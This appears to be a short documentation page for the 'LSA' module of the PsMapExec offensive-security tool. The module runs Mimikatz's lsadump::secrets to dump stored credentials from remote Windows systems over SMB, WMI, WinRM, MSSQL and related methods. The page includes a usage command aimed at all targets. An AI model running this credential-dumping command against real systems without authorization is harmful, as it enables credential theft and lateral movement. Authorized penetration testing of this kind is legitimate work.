# LSA

Executes Mimikatz's lsadump::secrets on the target system.

Output for each system is stored in $pwd\PME\LSA\

# Usage

##### Standard execution

    PsMapExec [Method] -targets All -Module LSA -ShowOutput

# Optional Parameters

### 1) Displays each targets output to the console

    -ShowOutput

### 2) Display only successful results

    -SuccessOnly

# Supported Methods

1) MSSQL 

2) SMB 

3) SessionHunter

4) WMI 

5) WinRM
